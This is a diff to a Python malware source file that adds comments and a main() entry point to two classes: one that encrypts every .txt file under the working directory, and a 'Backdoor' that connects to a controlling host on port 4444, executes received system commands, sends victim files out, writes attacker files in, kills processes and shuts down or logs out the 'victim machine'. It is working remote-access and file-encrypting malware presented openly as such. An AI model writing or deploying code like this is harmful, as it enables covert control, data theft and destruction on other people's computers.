@@ -4,6 +4,7 @@ from Imports import *
 
 
 class Encrypto:
+    """A class used to encrypt/decrypt diractory level text files --> (.txt) files only"""
     def __init__(self):
         self.key = Fernet.generate_key()
         self.fernetObject = Fernet(self.key)
@@ -16,7 +17,7 @@ class Encrypto:
         for path,_,files in os.walk('./'):
             if files:
                 for f in files:
-                    if f.endswith('.txt'):
+                    if f.endswith('.txt'): # You can change your file extension here
                         with open(os.path.join(path,f),'rb') as file:
                             self.cipherText = self.fernetObject.encrypt(file.read())
                             
@@ -54,6 +55,7 @@ class Encrypto:
         return "Encrypto"
 
 
+
 class Backdoor:
     def __init__(self,ip,port):        
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -61,6 +63,7 @@ class Backdoor:
 
     
     def listOfProcesses(self):
+        """A function used for listing all the background processes of the victim machine"""
         pid_dict = {}
         for pid in psutil.pids():
             pid_dict[pid] = psutil.Process(pid).name()
@@ -69,6 +72,7 @@ class Backdoor:
 
 
     def killProcessByName(self,processName):    
+        """A function used for killing background processes form the victim machine"""
         PID = None
         listOfProcess = self.listOfProcesses()
         try:
@@ -95,6 +99,7 @@ class Backdoor:
 
         
     def recive(self,conn):
+        """A function used for reciving commands from the attacker machine"""
         json_data = ""
         
         while True:
@@ -106,6 +111,7 @@ class Backdoor:
     
     
     def sysInfo(self):
+        """A function used for getting the systemInfo of the victim machine"""
         try:
             info={}
             info['platform']=platform.system()
@@ -122,13 +128,15 @@ class Backdoor:
             
             
     def shutDown(self):
+        """A function used for shutDowning the victim machine"""
         if platform.system() == "Windows":
             os.system("shutdown /s /t 0")
         else:
             os.system("systemctl poweroff")
-    
+   
             
     def restart(self):
+        """A function used for restarting the victim machine"""
         if platform.system() == 'Windows':
             os.system("shutdown /r /t 0")
         else:
@@ -136,6 +144,7 @@ class Backdoor:
     
             
     def logOut(self): 
+        """A function used for loging out the victim machine"""
         if platform.system() == "Windows":
             os.system("shutdown /l /t 0")
         else:
@@ -143,29 +152,35 @@ class Backdoor:
             
     
     def download(self,path):
-       with open(path, 'rb')  as file:
+        """A function used for sending the victim files to the attacker machine"""
+        with open(path, 'rb')  as file:
            return base64.b64encode(file.read())
         
         
     def upload(self,path,data):
+        "A function used for writing(downloading) the attacker's file to the victim machine"
         with open(path,'wb') as file:
             file.write(base64.b64decode(data))    
     
     
     def send(self,data):
+        """A function used for sending command response to the attacker machine"""
         self.connection.send(json.dumps(data).encode())
         
         
     def changeDir(self,path):
+        """A function used for changing the current working diractory of the victim maching"""
         os.chdir(path)
         return " changed diractory to {}".format(path)
         
         
     def executeSystemCommand(self,command):
+        """A function used for executing system commands on the victim machine"""
         return subprocess.check_output(command)
     
     
     def startBackdoor(self):
+        """A function used for starting the backdoor"""
         resultList = ""
         while True:
             command = self.connection.recv(1024).decode()
@@ -226,11 +241,14 @@ class Backdoor:
 
                 
     def __str__(self):
-        return f'Backdoor Class'
+        return f'Backdoor'
+
+
                 
+def main():
+    backdoor = Backdoor('localhost',4444)
+    backdoor.startBackdoor()
 
-backdoor = Backdoor('localhost',4444)
-backdoor.startBackdoor()
 
-
-
+if __name__ == "__main__":
+    main()
